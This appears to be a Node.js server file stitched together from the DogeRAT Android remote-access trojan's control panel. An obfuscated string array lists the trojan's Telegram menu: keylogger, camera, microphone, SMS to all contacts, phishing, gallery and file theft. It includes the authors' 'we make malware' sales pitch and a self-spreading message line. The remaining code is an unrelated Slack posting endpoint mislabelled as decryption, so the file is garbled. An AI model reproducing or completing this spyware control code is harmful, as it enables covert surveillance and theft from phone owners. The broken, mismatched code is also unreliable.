const express = require('express');
const app = express();
const port = process.env.PORT || 3000;
const fs = require('fs');
const path = require('path');
const { WebClient } = require('@slack/web-api'); // Example for Slack integration
const some_decryption_value = process.env.SOME_DECRYPTION_VALUE || 'default-value';

// Decryption function (pseudo implementation)
function decryption_function() {
    const _0x3a62f5 = [
        '<b>✯ Select device to perform action</b>\n\n',
        '22kyhfRQ',
        'file',
        'sockets',
        'log',
        '✯ Clipboard ✯',
        'express',
        '<b>✯ Enter a phone number that you want to send SMS</b>\n\n',
        '<b>✯ New device connected</b>\n\n',
        'multer',
        '✯ Send SMS to all contacts ✯',
        '84cPlils',
        '<b>✯ Main menu</b>\n\n',
        '<b>version</b> → ',
        'listen',
        'readFileSync',
        '<b>✯ Select action to perform for all available devices</b>\n\n',
        'popNotification',
        'shift',
        '3234gTfIoe',
        'time',
        'all-sms',
        'no information',
        '1892960kuvEMZ',
        'vibrateDuration',
        'emit',
        '✯ Action ✯',
        'contacts',
        'size',
        '3961580aPaxKE',
        '✯ Cancel action ✯',
        '/text',
        '✯ Main camera ✯',
        'all',
        'smsNumber',
        '<b>✯ Enter text that you want to send to all target contacts</b>\n\n',
        'toast',
        'currentNotificationText',
        '2169665ymIjdB',
        '3426UnzfvN',
        'get',
        '✯ SMS ✯',
        '3539044apenns',
        '<b>✯ Message received from → ',
        '✯ Back to main menu ✯',
        '✯ Decrypt ✯',
        '<b>✯ Device disconnected</b>\n\n',
        'currentNumber',
        'set',
        'selfie-camera',
        'http',
        '<b>✯ There is no connected device</b>\n\n',
        '14859208ppOnuo',
        'originalname',
        'Developed by: @CYBERSHIELDX',
        ' Devices ✯',
        'single',
        'post',
        '<b>✯ The request was executed successfully, you will receive device response soon ...\n\n✯ Return to main menu</b>\n\n',
        '✯ Keylogger ON ✯',
        '/start',
        'currentTarget',
        '✯ Devices ✯',
        'smsToAllContacts',
        'disconnect',
        'handshake',
        'duration',
        'toastText',
        '✯ Stop Audio ✯',
        'text',
        'DOGERAT is a malware to control Android devices\nAny misuse is the responsibility of the person!\n\n',
        '<b>Device',
        '<b>✯ Select action to perform for',
        'notificationText',
        '✯ Screenshot ✯',
        '✯ Vibrate ✯',
        '<b>✯ Enter text that you want to appear as notification</b>\n\n',
        '18HiKXqZ',
        'PORT',
        'keylogger-off',
        '<b>ip</b> → ',
        'currentAction',
        '✯ About us ✯',
        'calls',
        'url',
        '628531Xzwdkr',
        'commend',
        'Done',
        '5UQRBbM',
        '157863kmaaoD',
        'env',
        'token',
        '✯ Gallery ✯',
        '✯ Calls ✯',
        'createServer',
        'textToAllContacts',
        '6831234vSnSLj',
        '✯ Play audio ✯',
        'sendMessage',
        'utf8',
        'smsText',
        'headers',
        '✯ Phishing ✯',
        '/upload',
        '✯ Encrypt ✯',
        'forEach',
        '232370LYMeOO',
        '2414186GnuxVX',
        '<b>✯ Enter the microphone recording duration in seconds</b>\n\n',
        '*/*',
        'keylogger-on',
        'delete',
        '1292HGSYoP',
        'socket.io',
        '<b>time</b> → ',
        'HTML',
        'ping',
        '<b>✯ Welcome to DOGERAT</b>\n\n',
        'apps',
        'microphoneDuration',
        '2111820yZWyTe',
        '<b>model</b> → ',
        '<b>✯ Enter a message that you want to appear in toast box</b>\n\n',
        '721588iBLdHC',
        '✯ Open URL ✯',
        'buffer',
        'send',
        '<b>✯ If you want to hire us for any paid work please contact @sphanter\nWe hack, We leak, We make malware\n\nTelegram → @CUBERSHIELDX\nADMIN → @SPHANTER</b>\n\n',
        '\n\nMessage → </b>',
        '✯ Toast ✯',
        'sendSms',
        './data.json',
        'https',
        '<b>✯ Connected devices count: ',
        '7207620ZaPjbY',
        '✯ File explorer ✯',
        'connection',
        'push',
        '✯ Keylogger OFF ✯',
        '✯ Selfie Camera ✯',
        'error',
        '<b>✯ Now Enter a message that you want to send to ',
        'model',
        '<b>✯ This option is only available on premium version dm to buy @sphanter</b>\n\n',
        '✯ Microphone ✯',
        '✯ Contacts ✯',
        'main-camera',
        '</b>\n\n',
        '✯ Send SMS ✯',
        '12AEDsDj',
        '✯ Apps ✯',
        'vibrate'
    ];

    return _0x3a62f5;
}

// Configure environment variables
const token = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;
const host = process.env.HOST || 'http://localhost:3000';
const text = 'dont write anything here it works only in premium version this feature send this line on all contacts after installation';

app.use(express.json());

app.post('/send-message', (req, res) => {
    const message = req.body.message;
    if (!message) {
        return res.status(400).json({ error: 'Message is required' });
    }

    // Example of using Slack WebClient (if applicable)
    const webClient = new WebClient(token);
    webClient.chat.postMessage({
        channel: chatId,
        text: message
    }).then(response => {
        res.json({ success: true });
    }).catch(error => {
        console.error(error);
        res.status(500).json({ error: 'Failed to send message' });
    });
});

app.listen(port, () => {
    console.log(`Server is running on ${host}`);
});
      
